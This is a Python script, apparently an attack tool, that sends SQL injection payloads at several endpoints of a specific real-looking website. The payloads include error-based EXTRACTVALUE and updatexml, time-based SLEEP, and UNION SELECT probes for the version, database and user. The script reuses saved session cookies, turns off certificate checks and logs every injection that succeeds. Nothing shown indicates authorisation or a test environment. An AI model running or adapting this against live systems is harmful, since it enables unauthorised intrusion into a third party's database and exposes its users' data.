#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import urllib.parse
import json
import time
import re
import urllib3
urllib3.disable_warnings()

class SQLiVerified:
    def __init__(self):
        self.base_url = "https://emsone.com.vn"
        self.session = requests.Session()
        self.session.verify = False
        self.load_session()
        self.results = []
        
    def load_session(self):
        try:
            with open('session_cookies.json', 'r') as f:
                cookies = json.load(f)
                self.session.cookies.update(cookies)
        except:
            pass
    
    def test_error_injection(self):
        """测试报错注入"""
        print("[*] 测试报错注入: /Account/GetUserInfo")
        
        payloads = [
            "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
            "1' AND updatexml(1, CONCAT(0x7e, (SELECT version()), 0x7e), 1)--",
            "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        ]
        
        for payload in payloads:
            url = f"{self.base_url}/Account/GetUserInfo?id={urllib.parse.quote(payload)}"
            try:
                r = self.session.get(url, timeout=10)
                content_lower = r.text.lower()
                
                if 'extractvalue' in content_lower or 'version' in content_lower or 'microsoft' in content_lower or 'sql' in content_lower:
                    print(f"    [!] Payload有效: {payload[:50]}")
                    print(f"        Response: {r.text[:500]}")
                    self.results.append({
                        'type': 'Error-based SQL Injection',
                        'endpoint': '/Account/GetUserInfo',
                        'payload': payload,
                        'response': r.text[:1000]
                    })
                    
                    # 提取版本
                    version_match = re.search(r'(\d+\.\d+\.\d+\.\d+|\d+\.\d+\.\d+)', r.text)
                    if version_match:
                        print(f"        [+] 版本: {version_match.group(1)}")
            except:
                pass
    
    def test_time_based(self):
        """测试时间盲注"""
        print("[*] 测试时间盲注")
        
        endpoints = [
            ("/Handle/SearchListProvince", {"Type": "1"}),
            ("/Handle/SearchListWardByDistrictID", {"DistrictID": "1"}),
            ("/Account/GetUserInfo", {"id": "1"}),
        ]
        
        payload = "1' AND SLEEP(5)--"
        
        for endpoint, params in endpoints:
            url = f"{self.base_url}{endpoint}"
            query = "&".join([f"{k}={urllib.parse.quote(payload)}" for k, v in params.items()])
            test_url = f"{url}?{query}"
            
            try:
                start = time.time()
                r = self.session.get(test_url, timeout=15)
                elapsed = time.time() - start
                
                if elapsed > 4:
                    print(f"    [!] 时间延迟: {endpoint} ({elapsed:.2f}s)")
                    self.results.append({
                        'type': 'Time-based SQL Injection',
                        'endpoint': endpoint,
                        'payload': payload,
                        'delay': elapsed
                    })
            except:
                pass
    
    def test_union_actual(self):
        """实际测试Union注入"""
        print("[*] 实际测试Union注入")
        
        # 测试是否能注入字符串
        payload = "1' UNION SELECT 'SQLINJECTION123'--"
        url = f"{self.base_url}/Handle/SearchListProvince?Type={urllib.parse.quote(payload)}"
        
        try:
            r = self.session.get(url, timeout=10)
            
            # 检查响应
            if 'SQLINJECTION123' in r.text:
                print(f"    [!] Union注入成功: 字符串可注入")
                self.results.append({
                    'type': 'Union-based SQL Injection (Confirmed)',
                    'endpoint': '/Handle/SearchListProvince',
                    'payload': payload,
                    'confirmed': True
                })
            
            # 尝试提取数据
            data_payloads = [
                "1' UNION SELECT version()--",
                "1' UNION SELECT database()--",
                "1' UNION SELECT user()--",
            ]
            
            for data_payload in data_payloads:
                test_url = f"{self.base_url}/Handle/SearchListProvince?Type={urllib.parse.quote(data_payload)}"
                r2 = self.session.get(test_url, timeout=10)
                
                # 检查是否包含SQL函数结果
                if 'version' in r2.text.lower() or 'database' in r2.text.lower() or len(r2.text) != 3710:
                    print(f"    [!] 数据提取可能成功")
                    print(f"        Response: {r2.text[:300]}")
        except:
            pass
    
    def save_results(self):
        """保存结果"""
        with open('sqli_verified_results.json', 'w', encoding='utf-8') as f:
            json.dump(self.results, f, indent=2, ensure_ascii=False)
        
        print(f"\n[+] 验证结果: {len(self.results)} 个有效漏洞")
        for r in self.results:
            print(f"  - {r['type']}: {r['endpoint']}")
    
    def run_all(self):
        """执行所有验证"""
        self.test_error_injection()
        self.test_time_based()
        self.test_union_actual()
        self.save_results()

if __name__ == "__main__":
    sqli = SQLiVerified()
    sqli.run_all()